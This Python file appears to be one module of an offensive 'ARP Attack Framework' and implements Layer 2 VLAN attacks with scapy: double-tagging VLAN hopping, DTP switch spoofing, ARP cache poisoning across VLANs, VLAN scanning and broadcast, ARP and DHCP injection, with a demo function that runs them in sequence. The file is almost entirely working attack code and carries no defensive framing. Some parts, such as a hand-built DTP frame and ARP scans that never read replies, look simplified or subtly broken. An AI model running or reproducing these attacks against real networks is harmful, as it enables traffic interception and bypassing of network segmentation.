#!/usr/bin/env python3
"""
ARP Attack Framework - Professional Grade
VLAN Attacks Extension
"""

import threading
import time
import logging
import struct
from typing import Optional, List, Dict, Set, Tuple
from dataclasses import dataclass
from enum import Enum

from scapy.all import (
    ARP, Ether, sendp, sniff, conf, get_if_hwaddr,
    IP, ICMP, TCP, UDP, Dot1Q, Packet, RandMAC,
    LLC, SNAP, STP, DHCP, BOOTP
)
from scapy.sendrecv import AsyncSniffer
from scapy.layers.l2 import ETHER_TYPES, getmacbyip

from attack.leyer_2.arp import AdvancedARPSpoofing

# Configure VLAN logging
logger = logging.getLogger('ARP_Attacks.VLAN')


class VLANAttackType(Enum):
    """Types of VLAN attacks"""
    VLAN_HOPPING = "vlan_hopping"
    DOUBLE_TAGGING = "double_tagging"
    VLAN_ARP_SPOOFING = "vlan_arp_spoofing"
    VLAN_SCANNING = "vlan_scanning"
    VLAN_INJECTION = "vlan_injection"
    DTP_ATTACK = "dtp_attack"
    VTP_ATTACK = "vtp_attack"
    STP_ATTACK = "stp_attack"


@dataclass
class VLANConfig:
    """VLAN configuration parameters"""
    native_vlan: int = 1
    target_vlans: List[int] = None
    trunk_encapsulation: str = "dot1q"  # dot1q or isl
    attack_interface: str = "eth0"

    def __post_init__(self):
        if self.target_vlans is None:
            self.target_vlans = [10, 20, 30, 40, 50, 100, 200]


class VLANDiscovery:
    """VLAN Network Discovery and Mapping"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.discovered_vlans: Set[int] = set()
        self.vlan_hosts: Dict[int, Dict[str, str]] = {}
        self.sniffer = None
        self.running = False

    def start_vlan_discovery(self, duration: int = 120) -> Dict[int, Dict[str, str]]:
        """Passive VLAN discovery through traffic analysis"""
        logger.info(f"Starting VLAN discovery for {duration} seconds")

        self.running = True
        self.discovered_vlans.clear()
        self.vlan_hosts.clear()

        # Start sniffing for VLAN-tagged traffic
        self.sniffer = AsyncSniffer(
            iface=self.iface,
            filter="ether proto 0x8100 or ether proto 0x88a8",
            prn=self._analyze_vlan_packet,
            store=False
        )
        self.sniffer.start()

        # Also send some probes
        threading.Thread(target=self._send_vlan_probes, daemon=True).start()

        time.sleep(duration)
        self.stop_discovery()

        return self.vlan_hosts

    def _analyze_vlan_packet(self, pkt):
        """Analyze VLAN-tagged packets"""
        try:
            if Dot1Q in pkt:
                vlan_id = pkt[Dot1Q].vlan
                self.discovered_vlans.add(vlan_id)

                # Extract host information
                if Ether in pkt:
                    src_mac = pkt[Ether].src

                    if vlan_id not in self.vlan_hosts:
                        self.vlan_hosts[vlan_id] = {}

                    if src_mac not in self.vlan_hosts[vlan_id]:
                        self.vlan_hosts[vlan_id][src_mac] = "unknown"

                        if self.verbose:
                            logger.info(f"Discovered host {src_mac} on VLAN {vlan_id}")

                # Look for IP information
                if IP in pkt:
                    src_ip = pkt[IP].src
                    self.vlan_hosts[vlan_id][src_mac] = src_ip

        except Exception as e:
            if self.verbose:
                logger.debug(f"VLAN packet analysis error: {e}")

    def _send_vlan_probes(self):
        """Send VLAN discovery probes"""
        vlans_to_probe = list(range(1, 4095))

        while self.running and vlans_to_probe:
            for vlan_id in vlans_to_probe[:100]:  # Probe in batches
                try:
                    # Send ARP request with VLAN tag
                    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                  Dot1Q(vlan=vlan_id) / \
                                  ARP(pdst=f"192.168.{vlan_id // 256}.{vlan_id % 256}")

                    sendp(arp_request, iface=self.iface, verbose=False)
                    time.sleep(0.01)

                except Exception as e:
                    if self.verbose:
                        logger.debug(f"VLAN probe error for VLAN {vlan_id}: {e}")

            vlans_to_probe = vlans_to_probe[100:]
            time.sleep(1)

    def stop_discovery(self):
        """Stop VLAN discovery"""
        self.running = False
        if self.sniffer:
            self.sniffer.stop()

        logger.info(f"VLAN discovery completed: {len(self.discovered_vlans)} VLANs found")
        for vlan_id in sorted(self.discovered_vlans):
            hosts = len(self.vlan_hosts.get(vlan_id, {}))
            logger.info(f"VLAN {vlan_id}: {hosts} hosts discovered")


class VLANHopping:
    """VLAN Hopping Attacks - Double Tagging and Switch Spoofing"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.attack_thread = None
        self.stats = {'packets_sent': 0, 'vlans_targeted': set()}

    def start_double_tagging_attack(self,
                                    native_vlan: int = 1,
                                    target_vlans: List[int] = None,
                                    target_ip: str = "192.168.1.1",
                                    duration: Optional[int] = None) -> Dict[str, any]:
        """Double Tagging VLAN Hopping Attack"""

        if target_vlans is None:
            target_vlans = [10, 20, 30, 40, 50]

        if self.running:
            return {"success": False, "error": "Attack already running"}

        self.running = True
        self.stats = {'packets_sent': 0, 'vlans_targeted': set(target_vlans)}

        logger.info(f"Starting Double Tagging attack: Native VLAN {native_vlan}, Target VLANs {target_vlans}")

        self.attack_thread = threading.Thread(
            target=self._double_tagging_loop,
            args=(native_vlan, target_vlans, target_ip, duration)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()

        return {"success": True, "target_vlans": target_vlans, "native_vlan": native_vlan}

    def _double_tagging_loop(self, native_vlan: int, target_vlans: List[int],
                             target_ip: str, duration: Optional[int]):
        """Double tagging attack loop"""
        start_time = time.time()

        while self.running:
            if duration and (time.time() - start_time) > duration:
                break

            try:
                for target_vlan in target_vlans:
                    # Create double-tagged packet
                    # Outer tag: native VLAN, Inner tag: target VLAN
                    double_tagged_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                        Dot1Q(vlan=native_vlan) / \
                                        Dot1Q(vlan=target_vlan) / \
                                        ARP(pdst=target_ip,
                                            psrc=f"192.168.{target_vlan}.100",
                                            hwsrc=RandMAC())

                    sendp(double_tagged_pkt, iface=self.iface, verbose=False)
                    self.stats['packets_sent'] += 1

                    if self.verbose and self.stats['packets_sent'] % 10 == 0:
                        logger.info(f"Double-tagged packets sent: {self.stats['packets_sent']}")

                time.sleep(2)

            except Exception as e:
                logger.error(f"Double tagging error: {e}")
                time.sleep(1)

        self.running = False

    def start_switch_spoofing_attack(self,
                                     target_vlans: List[int] = None,
                                     spoofed_mac: str = "00:00:0c:07:ac:01",  # Typical switch MAC
                                     duration: Optional[int] = None) -> Dict[str, any]:
        """Switch Spoofing Attack using DTP"""

        if target_vlans is None:
            target_vlans = [10, 20, 30]

        if self.running:
            return {"success": False, "error": "Attack already running"}

        self.running = True
        self.stats = {'packets_sent': 0, 'vlans_targeted': set(target_vlans)}

        logger.info(f"Starting Switch Spoofing attack for VLANs {target_vlans}")

        self.attack_thread = threading.Thread(
            target=self._switch_spoofing_loop,
            args=(target_vlans, spoofed_mac, duration)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()

        return {"success": True, "target_vlans": target_vlans}

    def _switch_spoofing_loop(self, target_vlans: List[int],
                              spoofed_mac: str, duration: Optional[int]):
        """Switch spoofing attack loop"""
        start_time = time.time()

        while self.running:
            if duration and (time.time() - start_time) > duration:
                break

            try:
                for vlan_id in target_vlans:
                    # Send DTP desirable mode packets to negotiate trunk
                    dtp_packet = Ether(src=spoofed_mac, dst="01:00:0c:cc:cc:cc") / \
                                 LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / \
                                 SNAP() / \
                                 self._create_dtp_desirable_frame(vlan_id)

                    sendp(dtp_packet, iface=self.iface, verbose=False)
                    self.stats['packets_sent'] += 1

                if self.verbose:
                    logger.info(f"DTP packets sent: {self.stats['packets_sent']}")

                time.sleep(5)  # DTP negotiations happen periodically

            except Exception as e:
                logger.error(f"Switch spoofing error: {e}")
                time.sleep(2)

        self.running = False

    def _create_dtp_desirable_frame(self, vlan_id: int) -> bytes:
        """Create DTP desirable mode frame"""
        # Simplified DTP frame structure
        dtp_frame = bytes([
            0x01,  # Version
            0x04,  # Domain length
            0x00, 0x00, 0x00, 0x00,  # Domain (zeros)
            0x03,  # Status: Desirable
            0x01,  # DTP type
            0x01,  # TLV type: Native VLAN
            0x02,  # Length
            (vlan_id >> 8) & 0xFF, vlan_id & 0xFF  # VLAN ID
        ])
        return dtp_frame

    def stop_hopping_attack(self):
        """Stop VLAN hopping attack"""
        if self.running:
            self.running = False
            if self.attack_thread and self.attack_thread.is_alive():
                self.attack_thread.join(timeout=5)

            logger.info(f"VLAN hopping stopped. Packets sent: {self.stats['packets_sent']}")
            return {"success": True, "packets_sent": self.stats['packets_sent']}

        return {"success": False, "error": "No attack running"}


class VLANARPspoofing:
    """VLAN-specific ARP Spoofing Attacks"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.spoof_threads: Dict[int, threading.Thread] = {}
        self.vlan_spoofers: Dict[int, AdvancedARPSpoofing] = {}

    def start_vlan_arp_spoofing(self,
                                vlan_targets: Dict[int, Tuple[str, str]],
                                technique: str = "bidirectional",
                                duration: Optional[int] = None) -> Dict[str, any]:
        """Start ARP spoofing across multiple VLANs"""

        if self.running:
            return {"success": False, "error": "Already running"}

        self.running = True
        results = {}

        for vlan_id, (target_ip, gateway_ip) in vlan_targets.items():
            try:
                # Create VLAN-specific spoofer
                spoofer = AdvancedARPSpoofing(self.iface, self.verbose)
                self.vlan_spoofers[vlan_id] = spoofer

                # Start spoofing in separate thread per VLAN
                thread = threading.Thread(
                    target=self._vlan_spoof_worker,
                    args=(vlan_id, target_ip, gateway_ip, technique, duration, spoofer)
                )
                thread.daemon = True
                thread.start()
                self.spoof_threads[vlan_id] = thread

                results[vlan_id] = {"success": True, "target": target_ip, "gateway": gateway_ip}
                logger.info(f"Started VLAN {vlan_id} ARP spoofing: {target_ip} <-> {gateway_ip}")

            except Exception as e:
                results[vlan_id] = {"success": False, "error": str(e)}
                logger.error(f"Failed to start VLAN {vlan_id} ARP spoofing: {e}")

        return {"success": True, "vlan_results": results}

    def _vlan_spoof_worker(self, vlan_id: int, target_ip: str, gateway_ip: str,
                           technique: str, duration: Optional[int], spoofer: AdvancedARPSpoofing):
        """Worker thread for VLAN ARP spoofing"""
        try:
            # Create VLAN-tagged ARP packets
            if technique == "bidirectional":
                self._vlan_bidirectional_spoof(vlan_id, target_ip, gateway_ip, duration, spoofer)
            elif technique == "unidirectional":
                self._vlan_unidirectional_spoof(vlan_id, target_ip, gateway_ip, duration, spoofer)

        except Exception as e:
            logger.error(f"VLAN {vlan_id} spoof worker error: {e}")

    def _vlan_bidirectional_spoof(self, vlan_id: int, target_ip: str, gateway_ip: str,
                                  duration: Optional[int], spoofer: AdvancedARPSpoofing):
        """Bidirectional ARP spoofing with VLAN tagging"""
        start_time = time.time()

        while self.running and spoofer.running:
            if duration and (time.time() - start_time) > duration:
                break

            try:
                # Get MAC addresses
                try:
                    target_mac = getmacbyip(target_ip)
                    gateway_mac = getmacbyip(gateway_ip)
                except:
                    target_mac = gateway_mac = "ff:ff:ff:ff:ff:ff"

                # Poison target (VLAN-tagged)
                arp_target = Ether(dst=target_mac) / \
                             Dot1Q(vlan=vlan_id) / \
                             ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)

                # Poison gateway (VLAN-tagged)
                arp_gateway = Ether(dst=gateway_mac) / \
                              Dot1Q(vlan=vlan_id) / \
                              ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)

                sendp(arp_target, iface=self.iface, verbose=False)
                sendp(arp_gateway, iface=self.iface, verbose=False)

                if self.verbose and spoofer.stats['packets_sent'] % 20 == 0:
                    logger.info(f"VLAN {vlan_id}: {spoofer.stats['packets_sent']} spoofing packets")

                time.sleep(2)

            except Exception as e:
                logger.error(f"VLAN {vlan_id} bidirectional spoof error: {e}")
                time.sleep(1)

    def _vlan_unidirectional_spoof(self, vlan_id: int, target_ip: str, gateway_ip: str,
                                   duration: Optional[int], spoofer: AdvancedARPSpoofing):
        """Unidirectional ARP spoofing with VLAN tagging"""
        start_time = time.time()

        while self.running and spoofer.running:
            if duration and (time.time() - start_time) > duration:
                break

            try:
                target_mac = getmacbyip(target_ip)

                # Only poison target
                arp_target = Ether(dst=target_mac) / \
                             Dot1Q(vlan=vlan_id) / \
                             ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)

                sendp(arp_target, iface=self.iface, verbose=False)

                time.sleep(3)

            except Exception as e:
                logger.error(f"VLAN {vlan_id} unidirectional spoof error: {e}")
                time.sleep(1)

    def stop_vlan_arp_spoofing(self):
        """Stop all VLAN ARP spoofing attacks"""
        self.running = False

        # Stop all spoofers
        for vlan_id, spoofer in self.vlan_spoofers.items():
            spoofer.stop_spoofing()

        # Wait for threads to finish
        for vlan_id, thread in self.spoof_threads.items():
            if thread.is_alive():
                thread.join(timeout=5)

        logger.info("All VLAN ARP spoofing attacks stopped")


class VLANScanning:
    """Active VLAN Scanning and Enumeration"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.scan_results: Dict[int, Dict[str, any]] = {}

    def comprehensive_vlan_scan(self,
                                scan_type: str = "arp",
                                target_vlans: List[int] = None,
                                timeout: int = 2) -> Dict[int, Dict[str, any]]:
        """Comprehensive VLAN scanning"""

        if target_vlans is None:
            target_vlans = list(range(1, 100))  # Scan first 100 VLANs

        logger.info(f"Starting comprehensive VLAN scan: {len(target_vlans)} VLANs")

        self.scan_results.clear()

        if scan_type == "arp":
            return self._arp_vlan_scan(target_vlans, timeout)
        elif scan_type == "icmp":
            return self._icmp_vlan_scan(target_vlans, timeout)
        elif scan_type == "tcp":
            return self._tcp_vlan_scan(target_vlans, timeout)
        else:
            return self._mixed_vlan_scan(target_vlans, timeout)

    def _arp_vlan_scan(self, target_vlans: List[int], timeout: int) -> Dict[int, Dict[str, any]]:
        """ARP-based VLAN scanning"""
        for vlan_id in target_vlans:
            try:
                # Try common IP patterns for each VLAN
                test_ips = [
                    f"10.{vlan_id}.1.1",
                    f"192.168.{vlan_id}.1",
                    f"172.16.{vlan_id}.1",
                    f"192.168.1.{vlan_id}",
                    f"10.1.{vlan_id}.1"
                ]

                for test_ip in test_ips:
                    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                  Dot1Q(vlan=vlan_id) / \
                                  ARP(pdst=test_ip)

                    # Send and potentially receive (simplified - in real implementation use srp)
                    sendp(arp_request, iface=self.iface, verbose=False, timeout=timeout)

                    # Store scan attempt
                    if vlan_id not in self.scan_results:
                        self.scan_results[vlan_id] = {
                            'scanned': True,
                            'responsive_ips': [],
                            'tested_ips': test_ips
                        }

                    if self.verbose:
                        logger.debug(f"Scanned VLAN {vlan_id} -> {test_ip}")

                time.sleep(0.1)  # Rate limiting

            except Exception as e:
                if self.verbose:
                    logger.debug(f"VLAN {vlan_id} scan error: {e}")

        return self.scan_results

    def _icmp_vlan_scan(self, target_vlans: List[int], timeout: int) -> Dict[int, Dict[str, any]]:
        """ICMP-based VLAN scanning"""
        # Similar to ARP scan but with ICMP packets
        for vlan_id in target_vlans:
            try:
                test_ips = [f"192.168.{vlan_id}.1", f"10.{vlan_id}.1.1"]

                for test_ip in test_ips:
                    icmp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                  Dot1Q(vlan=vlan_id) / \
                                  IP(dst=test_ip) / \
                                  ICMP()

                    sendp(icmp_packet, iface=self.iface, verbose=False, timeout=timeout)

                time.sleep(0.1)

            except Exception as e:
                if self.verbose:
                    logger.debug(f"VLAN {vlan_id} ICMP scan error: {e}")

        return self.scan_results

    def _tcp_vlan_scan(self, target_vlans: List[int], timeout: int) -> Dict[int, Dict[str, any]]:
        """TCP-based VLAN scanning"""
        common_ports = [80, 443, 22, 23, 21, 25, 53]

        for vlan_id in target_vlans:
            try:
                test_ip = f"192.168.{vlan_id}.1"

                for port in common_ports:
                    tcp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                                 Dot1Q(vlan=vlan_id) / \
                                 IP(dst=test_ip) / \
                                 TCP(dport=port, flags="S")

                    sendp(tcp_packet, iface=self.iface, verbose=False, timeout=timeout)

                time.sleep(0.05)

            except Exception as e:
                if self.verbose:
                    logger.debug(f"VLAN {vlan_id} TCP scan error: {e}")

        return self.scan_results

    def _mixed_vlan_scan(self, target_vlans: List[int], timeout: int) -> Dict[int, Dict[str, any]]:
        """Mixed protocol VLAN scanning"""
        # Combine all scanning techniques
        self._arp_vlan_scan(target_vlans, timeout)
        self._icmp_vlan_scan(target_vlans, timeout)
        self._tcp_vlan_scan(target_vlans, timeout)

        return self.scan_results


class VLANInjection:
    """VLAN Traffic Injection Attacks"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.running = False
        self.injection_thread = None
        self.stats = {'packets_injected': 0, 'vlans_targeted': set()}

    def start_vlan_injection(self,
                             target_vlans: List[int],
                             injection_type: str = "broadcast",
                             payload: str = "VLAN_INJECTION_TEST",
                             duration: Optional[int] = None) -> Dict[str, any]:
        """Start VLAN traffic injection"""

        if self.running:
            return {"success": False, "error": "Already running"}

        self.running = True
        self.stats = {'packets_injected': 0, 'vlans_targeted': set(target_vlans)}

        logger.info(f"Starting VLAN injection attack: {len(target_vlans)} VLANs, type: {injection_type}")

        self.injection_thread = threading.Thread(
            target=self._injection_loop,
            args=(target_vlans, injection_type, payload, duration)
        )
        self.injection_thread.daemon = True
        self.injection_thread.start()

        return {"success": True, "target_vlans": target_vlans, "injection_type": injection_type}

    def _injection_loop(self, target_vlans: List[int], injection_type: str,
                        payload: str, duration: Optional[int]):
        """VLAN injection main loop"""
        start_time = time.time()
        packet_count = 0

        while self.running:
            if duration and (time.time() - start_time) > duration:
                break

            try:
                for vlan_id in target_vlans:
                    if injection_type == "broadcast":
                        self._inject_broadcast(vlan_id, payload)
                    elif injection_type == "arp":
                        self._inject_arp(vlan_id)
                    elif injection_type == "dhcp":
                        self._inject_dhcp(vlan_id)
                    elif injection_type == "custom":
                        self._inject_custom(vlan_id, payload)

                    packet_count += 1
                    self.stats['packets_injected'] = packet_count

                    if self.verbose and packet_count % 10 == 0:
                        logger.info(f"Injected {packet_count} packets across {len(target_vlans)} VLANs")

                time.sleep(1)

            except Exception as e:
                logger.error(f"VLAN injection error: {e}")
                time.sleep(2)

        self.running = False

    def _inject_broadcast(self, vlan_id: int, payload: str):
        """Inject broadcast packets into VLAN"""
        broadcast_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                           Dot1Q(vlan=vlan_id) / \
                           IP(dst="255.255.255.255") / \
                           UDP(dport=9999) / \
                           payload.encode()

        sendp(broadcast_packet, iface=self.iface, verbose=False)

    def _inject_arp(self, vlan_id: int):
        """Inject ARP packets into VLAN"""
        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                     Dot1Q(vlan=vlan_id) / \
                     ARP(pdst=f"192.168.{vlan_id}.255",
                         psrc=f"192.168.{vlan_id}.100",
                         hwsrc=RandMAC())

        sendp(arp_packet, iface=self.iface, verbose=False)

    def _inject_dhcp(self, vlan_id: int):
        """Inject DHCP packets into VLAN"""
        dhcp_packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC()) / \
                      Dot1Q(vlan=vlan_id) / \
                      IP(src="0.0.0.0", dst="255.255.255.255") / \
                      UDP(sport=68, dport=67) / \
                      BOOTP(chaddr=RandMAC()) / \
                      DHCP(options=[("message-type", "discover"), "end"])

        sendp(dhcp_packet, iface=self.iface, verbose=False)

    def _inject_custom(self, vlan_id: int, payload: str):
        """Inject custom packets into VLAN"""
        custom_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                        Dot1Q(vlan=vlan_id) / \
                        IP(src=f"10.{vlan_id}.1.100", dst=f"10.{vlan_id}.1.255") / \
                        UDP() / \
                        payload.encode()

        sendp(custom_packet, iface=self.iface, verbose=False)

    def stop_injection(self):
        """Stop VLAN injection attack"""
        if self.running:
            self.running = False
            if self.injection_thread and self.injection_thread.is_alive():
                self.injection_thread.join(timeout=5)

            logger.info(f"VLAN injection stopped. Packets injected: {self.stats['packets_injected']}")
            return {"success": True, "packets_injected": self.stats['packets_injected']}

        return {"success": False, "error": "No injection running"}


# =============================================================================
# VLAN ATTACKS MANAGER - MAIN INTEGRATION CLASS
# =============================================================================

class VLANAttacksManager:
    """Main manager for all VLAN attacks - integrates with existing ARP framework"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose

        # Initialize all VLAN attack modules
        self.discovery = VLANDiscovery(iface, verbose)
        self.hopping = VLANHopping(iface, verbose)
        self.arp_spoofing = VLANARPspoofing(iface, verbose)
        self.scanning = VLANScanning(iface, verbose)
        self.injection = VLANInjection(iface, verbose)

        self.active_attacks: Dict[str, any] = {}

    def run_vlan_attack(self,
                        attack_type: VLANAttackType,
                        **kwargs) -> Dict[str, any]:
        """Execute VLAN attacks based on type"""

        logger.info(f"Executing VLAN attack: {attack_type.value}")

        try:
            if attack_type == VLANAttackType.VLAN_HOPPING:
                return self._execute_hopping_attack(**kwargs)

            elif attack_type == VLANAttackType.DOUBLE_TAGGING:
                return self._execute_double_tagging(**kwargs)

            elif attack_type == VLANAttackType.VLAN_ARP_SPOOFING:
                return self._execute_vlan_arp_spoofing(**kwargs)

            elif attack_type == VLANAttackType.VLAN_SCANNING:
                return self._execute_vlan_scanning(**kwargs)

            elif attack_type == VLANAttackType.VLAN_INJECTION:
                return self._execute_vlan_injection(**kwargs)

            else:
                return {"success": False, "error": f"Unknown attack type: {attack_type}"}

        except Exception as e:
            logger.error(f"VLAN attack execution error: {e}")
            return {"success": False, "error": str(e)}

    def _execute_hopping_attack(self, **kwargs) -> Dict[str, any]:
        """Execute VLAN hopping attack"""
        native_vlan = kwargs.get('native_vlan', 1)
        target_vlans = kwargs.get('target_vlans', [10, 20, 30])
        technique = kwargs.get('technique', 'double_tagging')

        if technique == 'double_tagging':
            return self.hopping.start_double_tagging_attack(
                native_vlan=native_vlan,
                target_vlans=target_vlans,
                duration=kwargs.get('duration')
            )
        else:
            return self.hopping.start_switch_spoofing_attack(
                target_vlans=target_vlans,
                duration=kwargs.get('duration')
            )

    def _execute_double_tagging(self, **kwargs) -> Dict[str, any]:
        """Execute double tagging attack"""
        return self.hopping.start_double_tagging_attack(**kwargs)

    def _execute_vlan_arp_spoofing(self, **kwargs) -> Dict[str, any]:
        """Execute VLAN ARP spoofing"""
        vlan_targets = kwargs.get('vlan_targets', {10: ("192.168.10.100", "192.168.10.1")})
        technique = kwargs.get('technique', 'bidirectional')
        duration = kwargs.get('duration')

        return self.arp_spoofing.start_vlan_arp_spoofing(
            vlan_targets=vlan_targets,
            technique=technique,
            duration=duration
        )

    def _execute_vlan_scanning(self, **kwargs) -> Dict[str, any]:
        """Execute VLAN scanning"""
        scan_type = kwargs.get('scan_type', 'arp')
        target_vlans = kwargs.get('target_vlans', list(range(1, 100)))
        timeout = kwargs.get('timeout', 2)

        return self.scanning.comprehensive_vlan_scan(
            scan_type=scan_type,
            target_vlans=target_vlans,
            timeout=timeout
        )

    def _execute_vlan_injection(self, **kwargs) -> Dict[str, any]:
        """Execute VLAN injection"""
        target_vlans = kwargs.get('target_vlans', [10, 20, 30])
        injection_type = kwargs.get('injection_type', 'broadcast')
        payload = kwargs.get('payload', 'VLAN_INJECTION_TEST')
        duration = kwargs.get('duration')

        return self.injection.start_vlan_injection(
            target_vlans=target_vlans,
            injection_type=injection_type,
            payload=payload,
            duration=duration
        )

    def stop_all_vlan_attacks(self) -> Dict[str, any]:
        """Stop all active VLAN attacks"""
        results = {}

        # Stop hopping attacks
        if self.hopping.running:
            results['hopping'] = self.hopping.stop_hopping_attack()

        # Stop ARP spoofing
        if self.arp_spoofing.running:
            self.arp_spoofing.stop_vlan_arp_spoofing()
            results['arp_spoofing'] = {"success": True}

        # Stop injection
        if self.injection.running:
            results['injection'] = self.injection.stop_injection()

        # Stop discovery
        self.discovery.stop_discovery()
        results['discovery'] = {"success": True}

        logger.info("All VLAN attacks stopped")
        return results

    def get_vlan_attack_status(self) -> Dict[str, any]:
        """Get status of all VLAN attacks"""
        return {
            'hopping_active': self.hopping.running,
            'arp_spoofing_active': self.arp_spoofing.running,
            'injection_active': self.injection.running,
            'discovery_active': self.discovery.running,
            'hopping_stats': self.hopping.stats,
            'injection_stats': self.injection.stats,
            'discovered_vlans': list(self.discovery.discovered_vlans),
            'scan_results': self.scanning.scan_results
        }


# =============================================================================
# USAGE EXAMPLES AND DEMONSTRATION
# =============================================================================

def demonstrate_vlan_attacks():
    """Demonstrate VLAN attacks usage"""
    iface = "eth0"  # Change to your interface

    # Initialize VLAN attacks manager
    vlan_mgr = VLANAttacksManager(iface, verbose=True)

    try:
        # 1. Discover VLANs
        print("=== VLAN Discovery ===")
        discovered_vlans = vlan_mgr.discovery.start_vlan_discovery(duration=30)
        print(f"Discovered VLANs: {discovered_vlans}")

        # 2. Scan specific VLANs
        print("\n=== VLAN Scanning ===")
        scan_results = vlan_mgr.run_vlan_attack(
            VLANAttackType.VLAN_SCANNING,
            target_vlans=[10, 20, 30, 40],
            scan_type="arp"
        )
        print(f"Scan results: {scan_results}")

        # 3. VLAN Hopping attack
        print("\n=== VLAN Hopping ===")
        hopping_result = vlan_mgr.run_vlan_attack(
            VLANAttackType.DOUBLE_TAGGING,
            native_vlan=1,
            target_vlans=[10, 20, 30],
            duration=30
        )
        print(f"Hopping result: {hopping_result}")

        # 4. VLAN ARP Spoofing
        print("\n=== VLAN ARP Spoofing ===")
        spoof_result = vlan_mgr.run_vlan_attack(
            VLANAttackType.VLAN_ARP_SPOOFING,
            vlan_targets={
                10: ("192.168.10.100", "192.168.10.1"),
                20: ("192.168.20.100", "192.168.20.1")
            },
            duration=30
        )
        print(f"Spoofing result: {spoof_result}")

        # Let attacks run for a bit
        time.sleep(10)

        # Check status
        status = vlan_mgr.get_vlan_attack_status()
        print(f"\nCurrent status: {status}")

    except KeyboardInterrupt:
        print("\nStopping attacks...")
    finally:
        # Clean up
        vlan_mgr.stop_all_vlan_attacks()


if __name__ == "__main__":
    demonstrate_vlan_attacks()